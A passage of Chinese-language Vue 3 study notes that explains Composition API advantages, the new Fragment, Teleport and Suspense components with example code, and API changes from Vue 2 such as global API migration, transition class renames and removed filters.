			return {...toRefs(car)}
		}
	}
</script>

<style>
	.app{
		background-color: gray;
		padding: 10px;
	}
</style>
```



# 四、Composition API 的优势

## 1.Options API 存在的问题

使用传统OptionsAPI中，新增或者修改一个需求，就需要分别在data，methods，computed里修改 。

<div style="width:600px;height:370px;overflow:hidden;float:left">
    <img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f84e4e2c02424d9a99862ade0a2e4114~tplv-k3u1fbpfcp-watermark.image" style="width:600px;float:left" />
</div>
<div style="width:300px;height:370px;overflow:hidden;float:left">
    <img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e5ac7e20d1784887a826f6360768a368~tplv-k3u1fbpfcp-watermark.image" style="zoom:50%;width:560px;left" /> 
</div>







































## 2.Composition API 的优势

我们可以更加优雅的组织我们的代码，函数。让相关功能的代码更加有序的组织在一起。

<div style="width:500px;height:340px;overflow:hidden;float:left">
    <img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bc0be8211fc54b6c941c036791ba4efe~tplv-k3u1fbpfcp-watermark.image"style="height:360px"/>
</div>
<div style="width:430px;height:340px;overflow:hidden;float:left">
    <img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6cc55165c0e34069a75fe36f8712eb80~tplv-k3u1fbpfcp-watermark.image"style="height:360px"/>
</div>



































# 五、新的组件

## 1.Fragment

- 在Vue2中: 组件必须有一个根标签
- 在Vue3中: 组件可以没有根标签, 内部会将多个标签包含在一个Fragment虚拟元素中
- 好处: 减少标签层级, 减小内存占用

## 2.Teleport

- 什么是Teleport？—— `Teleport` 是一种能够将我们的<strong style="color:#DD5145">组件html结构</strong>移动到指定位置的技术。

  ```vue
  <teleport to="移动位置">
  	<div v-if="isShow" class="mask">
  		<div class="dialog">
  			<h3>我是一个弹窗</h3>
  			<button @click="isShow = false">关闭弹窗</button>
  		</div>
  	</div>
  </teleport>
  ```

## 3.Suspense

- 等待异步组件时渲染一些额外内容，让应用有更好的用户体验

- 使用步骤：

  - 异步引入组件

    ```js
    import {defineAsyncComponent} from 'vue'
    const Child = defineAsyncComponent(()=>import('./components/Child.vue'))
    ```

  - 使用```Suspense```包裹组件，并配置好```default``` 与 ```fallback```

    ```vue
    <template>
    	<div class="app">
    		<h3>我是App组件</h3>
    		<Suspense>
    			<template v-slot:default>
    				<Child/>
    			</template>
    			<template v-slot:fallback>
    				<h3>加载中.....</h3>
    			</template>
    		</Suspense>
    	</div>
    </template>
    ```

具体看案例

```vue
<template>
	<div class="app">
		<h3>我是App组件</h3>
		<!--2. 格式不变:  使用```Suspense```包裹组件，并配置好```default``` 与 ```fallback``` -->
		<Suspense>
			<template v-slot:default>
				<Child/>
			</template>
			<template v-slot:fallback>
				<h3>稍等，加载中...</h3>
			</template>
		</Suspense>
	</div>
</template>
/*
1. 等待异步组件时渲染一些额外内容，让应用有更好的用户体验
*/ 
<script>
	// import Child from './components/Child'//静态引入
	// 异步引入组件
	import {defineAsyncComponent} from 'vue' 
	const Child = defineAsyncComponent(()=>import('./components/Child')) //异步引入
	export default {
		name:'App',
		components:{Child},
	}
</script>

<style>
	.app{
		background-color: gray;
		padding: 10px;
	}
</style>
```

不用非得用async setup(){},这里只是测试

```vue
<template>
	<div class="child">
		<h3>我是Child组件</h3>
		{{sum}}
	</div>
</template>

<script>
	import {ref} from 'vue'
	export default {
		name:'Child',
		// async 表示异步
		async setup(){
			let sum = ref(0)
			let p = new Promise((resolve,reject)=>{
				setTimeout(()=>{
					resolve({sum})
				},3000)
			})
			// await 等待p成功的结果
			return await p
		}
	}
</script>

<style>
	.child{
		background-color: skyblue;
		padding: 10px;
	}
</style>
```



# 六、其他

## 1.全局API的转移

- Vue 2.x 有许多全局 API 和配置。

  - 例如：注册全局组件、注册全局指令等。

    ```js
    //注册全局组件
    Vue.component('MyButton', {
      data: () => ({
        count: 0
      }),
      template: '<button @click="count++">Clicked {{ count }} times.</button>'
    })
    
    //注册全局指令
    Vue.directive('focus', {
      inserted: el => el.focus()
    }
    ```

- Vue3.0中对这些API做出了调整：

  - 将全局的API，即：```Vue.xxx```调整到应用实例（```app```）上

    | 2.x 全局 API（```Vue```） | 3.x 实例 API (`app`)                        |
    | ------------------------- | ------------------------------------------- |
    | Vue.config.xxxx           | app.config.xxxx                             |
    | Vue.config.productionTip  | <strong style="color:#DD5145">移除</strong> |
    | Vue.component             | app.component                               |
    | Vue.directive             | app.directive                               |
    | Vue.mixin                 | app.mixin                                   |
    | Vue.use                   | app.use                                     |
    | Vue.prototype             | app.config.globalProperties                 |

## 2.其他改变

- data选项应始终被声明为一个函数。

- 过度类名的更改：

  - Vue2.x写法

    ```css
    .v-enter,
    .v-leave-to {
      opacity: 0;
    }
    .v-leave,
    .v-enter-to {
      opacity: 1;
    }
    ```

  - Vue3.x写法

    ```css
    .v-enter-from,
    .v-leave-to {
      opacity: 0;
    }
    
    .v-leave-from,
    .v-enter-to {
      opacity: 1;
    }
    ```

- <strong style="color:#DD5145">移除</strong>keyCode作为 v-on 的修饰符，同时也不再支持```config.keyCodes```

- <strong style="color:#DD5145">移除</strong>```v-on.native```修饰符

  - 父组件中绑定事件

    ```vue
    <my-component
      v-on:close="handleComponentEvent"
      v-on:click="handleNativeClickEvent"
    />
    ```

  - 子组件中声明自定义事件

    ```vue
    <script>
      export default {
        emits: ['close']
      }
    </script>
    ```

- <strong style="color:#DD5145">移除</strong>过滤器（filter）

  > 过滤器虽然这看起来很方便，但它需要一个自定义语法，打破大括号内表达式是 “只是 JavaScript” 的假设，这不仅有学习成本，而且有实现成本！建议用方法调用或计算属性去替换过滤器。

- ......
